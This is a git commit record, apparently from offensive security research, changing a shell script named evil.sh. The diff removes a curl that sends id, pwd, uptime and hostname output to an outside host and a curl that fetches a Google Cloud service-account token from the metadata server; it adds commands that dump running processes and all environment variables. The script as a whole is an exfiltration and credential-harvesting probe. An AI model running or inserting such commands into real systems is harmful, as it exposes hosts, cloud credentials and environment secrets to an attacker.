831c1c7fb573db2d4f4eb6c711a45182288dd5a8
wouter <wouter@recon.offensi.com>
2019-05-07 16:44:01 +0200

    pompom

--- evil.sh
+++ evil.sh
@@ -1,5 +1,4 @@
 #!/bin/sh
-
-curl http://recon.offensi.com/`id;pwd;uptime;hostname`
-curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+ps auxww
+export
 exit 1
